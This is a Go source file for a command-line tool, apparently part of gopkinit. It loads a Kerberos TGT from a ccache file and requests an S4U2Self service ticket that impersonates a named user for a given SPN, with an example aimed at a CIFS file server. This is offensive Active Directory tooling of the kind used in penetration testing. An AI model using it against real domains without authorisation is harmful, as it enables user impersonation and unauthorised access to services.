package main

import (
"flag"
"fmt"
"log"
"os"
"strings"

"github.com/ineffectivecoder/gopkinit/pkg/s4u"
)

func main() {
	ccachePath := flag.String("ccache", "", "Path to ccache file containing TGT")
	impersonate := flag.String("impersonate", "", "User to impersonate (username or user@realm)")
	spn := flag.String("spn", "", "Service principal name (service/host or service/host@realm)")
	dcIP := flag.String("dc-ip", "", "IP address of domain controller")
	output := flag.String("out", "", "Output ccache file path")
	verbose := flag.Bool("v", false, "Verbose output")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: %s [options]\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Obtains a service ticket for another user using S4U2Self.\n\n")
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExample:\n")
		fmt.Fprintf(os.Stderr, "  %s -ccache admin.ccache -impersonate user@DOMAIN.COM \\\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "    -spn cifs/fileserver.domain.com@DOMAIN.COM -dc-ip 10.0.0.1 -out user_cifs.ccache\n")
	}

	flag.Parse()

	if *ccachePath == "" {
		log.Fatal("Error: -ccache is required")
	}
	if *impersonate == "" {
		log.Fatal("Error: -impersonate is required")
	}
	if *spn == "" {
		log.Fatal("Error: -spn is required")
	}
	if *dcIP == "" {
		log.Fatal("Error: -dc-ip is required")
	}
	if *output == "" {
		log.Fatal("Error: -out is required")
	}

	targetUser, targetRealm := parseUserRealm(*impersonate)
	if targetUser == "" {
		log.Fatal("Error: invalid impersonate format (use user@REALM)")
	}

	serviceName, serviceRealm := parseSPNRealm(*spn)
	if serviceName == "" {
		log.Fatal("Error: invalid SPN format (use service/host@REALM)")
	}

	if *verbose {
		log.Printf("Using ccache: %s", *ccachePath)
		log.Printf("Impersonating: %s@%s", targetUser, targetRealm)
		log.Printf("Service: %s@%s", serviceName, serviceRealm)
		log.Printf("KDC address: %s:88", *dcIP)
	}

	client, err := s4u.NewS4U2SelfClient(*ccachePath, *dcIP)
	if err != nil {
		log.Fatalf("Failed to initialize S4U2Self client: %v", err)
	}

	if *verbose {
		log.Println("Sending S4U2Self TGS-REQ...")
	}

	if err := client.GetS4U2SelfTicket(targetUser, targetRealm, serviceName, serviceRealm, *output); err != nil {
		log.Fatalf("Failed to get S4U2Self ticket: %v", err)
	}

	fmt.Printf("Successfully obtained service ticket for %s@%s\n", targetUser, targetRealm)
	fmt.Printf("Saved to: %s\n", *output)
}

func parseUserRealm(input string) (string, string) {
	parts := strings.Split(input, "@")
	if len(parts) == 2 {
		return parts[0], parts[1]
	}
	if len(parts) == 1 {
		return parts[0], ""
	}
	return "", ""
}

func parseSPNRealm(input string) (string, string) {
	parts := strings.Split(input, "@")
	if len(parts) == 2 {
		return parts[0], parts[1]
	}
	if len(parts) == 1 {
		return parts[0], ""
	}
	return "", ""
}
